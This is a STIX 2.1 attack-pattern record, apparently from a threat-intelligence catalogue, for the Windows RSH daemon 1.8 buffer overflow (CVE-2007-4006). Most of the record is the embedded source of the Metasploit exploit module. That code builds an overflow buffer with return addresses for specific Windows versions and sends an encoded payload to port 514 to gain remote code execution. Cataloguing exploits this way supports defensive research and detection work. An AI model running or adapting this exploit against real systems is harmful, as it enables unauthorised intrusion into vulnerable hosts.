{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e5c066e6-1485-43fd-935c-528adfe3a3bd",
    "created": "2024-08-14T16:46:13.324465Z",
    "modified": "2024-08-14T16:46:13.324469Z",
    "name": "Windows RSH Daemon Buffer Overflow",
    "description": " This module exploits a vulnerability in Windows RSH daemon 1.8. The vulnerability is due to a failure to check for the length of input sent to the RSH server. A CPORT of 512 -> 1023 must be configured for the exploit to be successful. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/windows_rsh.rb",
            "external_id": "windows_rsh.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-4006"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Windows RSH Daemon Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a vulnerability in Windows RSH daemon 1.8.\n        The vulnerability is due to a failure to check for the length of input sent\n        to the RSH server. A CPORT of 512 -> 1023 must be configured for the exploit\n        to be successful.\n      },\n      'Author'         => 'MC',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n            ['CVE', '2007-4006'],\n            ['OSVDB', '38572'],\n            ['BID', '25044'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n          'AllowWin32SEH' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 850,\n          'BadChars' => \"\\x00\",\n          'PrependEncoder' => \"\\x81\\xc4\\xff\\xef\\xff\\xff\\x44\",\n          'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n            [ 'Windows 2003 SP1 English',         { 'Ret' => 0x77409dbb } ],\n            [ 'Windows XP Pro SP2 English',       { 'Ret' => 0x7e497c7b } ],\n            [ 'Windows 2000 Pro SP4 English',     { 'Ret' => 0x77f81be3 } ],\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2007-07-24',\n      'DefaultTarget' => 0))\n\n    register_options([Opt::RPORT(514)])\n  end\n\n  def exploit\n    connect\n\n    sploit =  ((\"\\x00\" + rand_text_english(1)) * 2) + \"\\x00\"\n    sploit << rand_text_english(1024) + [target.ret].pack('V')\n    sploit << payload.encoded\n\n    print_status(\"Trying target #{target.name}...\")\n\n    sock.put(sploit)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-07-24",
    "x_mitre_platforms": [
        "win'"
    ]
}